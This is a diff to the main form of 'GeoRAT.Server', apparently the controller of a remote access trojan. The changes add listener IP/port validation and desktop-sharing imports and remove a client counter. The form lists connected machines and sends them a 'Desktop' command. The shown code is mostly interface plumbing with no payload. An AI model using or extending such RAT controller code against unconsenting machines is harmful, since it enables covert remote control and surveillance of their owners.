@@ -1,5 +1,7 @@
 ﻿
 using System;
+using System.Drawing;
+using System.IO;
 using System.Net.Sockets;
 using System.Windows.Forms;
 using GeoRAT.Server.CommandHandlers;
@@ -7,16 +9,16 @@ using GeoRAT.Server.Net;
 using GeoRAT.Core.Commands;
 using GeoRAT.Core.PacketStruct;
 using GeoRAT.Core.Compressor;
+using GeoRAT.Server.Net.DesktopSharing;
 using Microsoft.VisualBasic;
-
-
+using StreamLibrary;
+using StreamLibrary.UnsafeCodecs;
 
 namespace GeoRAT.Server
 {
     public partial class Form1 : Form
     {
         private CommandSender Sender;
-        private int ClientsConnected;
         public Form1()
         {
             InitializeComponent();
@@ -27,19 +29,26 @@ namespace GeoRAT.Server
 
         private void xylosButton1_Click(object sender, EventArgs e)
         {
-            try
+            var ip = xylosTextBox1.Text;
+            int port;
+            bool convert = Int32.TryParse(xylosTextBox2.Text, out  port);
+            if (!convert && string.IsNullOrEmpty(ip) || !convert || string.IsNullOrEmpty(ip))
+            {
+                MessageBox.Show("Enter correct IP and Port!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+
+            }
+            else
             {
 
-                var IP = xylosTextBox1.Text;
-                var PORT = int.Parse(xylosTextBox2.Text);
-                NetworkServer ns = new NetworkServer(IP, PORT);
+                NetworkServer ns = new NetworkServer(ip, port);
                 ns.OnConnected += OnConnectedHandler;
                 ns.Start();
+                MessageBox.Show(ip + ":" + port.ToString(), "Listener started on", MessageBoxButtons.OK,
+                    MessageBoxIcon.Information);
+
             }
-            catch
-            {
-                MessageBox.Show("Enter valid IP address and port!", "Something went wrong", MessageBoxButtons.OK, MessageBoxIcon.Error);
-            }
+            
+                
         }
 
         #endregion
@@ -93,8 +102,7 @@ namespace GeoRAT.Server
                     item.SubItems.Add(data.OS);
                     item.SubItems.Add(data.CPU);
                     lvConnections.Items.Add(item);
-                    ClientsConnected++;
-                    UpdateOnline();
+                    
 
                 }));
         }
@@ -105,10 +113,7 @@ namespace GeoRAT.Server
 
         #region Disconnection
 
-        private void UpdateOnline()
-        {
-            --ClientsConnected;
-        }
+       
         //if client disconnects, remove it from listview 
 
         private void OnDisconnectedHandler(Socket s)
@@ -116,12 +121,10 @@ namespace GeoRAT.Server
             Invoke(new Action(
                 () =>
                 {
-                    foreach (ListViewItem i in lvConnections.Items)
+                   foreach (ListViewItem i in lvConnections.Items)
                         if ((Socket)i.Tag == s)
                         {
-                            i.Remove();
-                            --ClientsConnected;
-                            UpdateOnline();
+                          i.Remove();
                         }
                 }));
 
@@ -176,10 +179,11 @@ namespace GeoRAT.Server
             foreach (ListViewItem i in lvConnections.SelectedItems)
             {
                 Sender = new CommandSender((Socket) i.Tag, new Commands("Desktop", ""));
-                
-            }
+              }
         }
         #endregion
+
+       
 
     }
 }
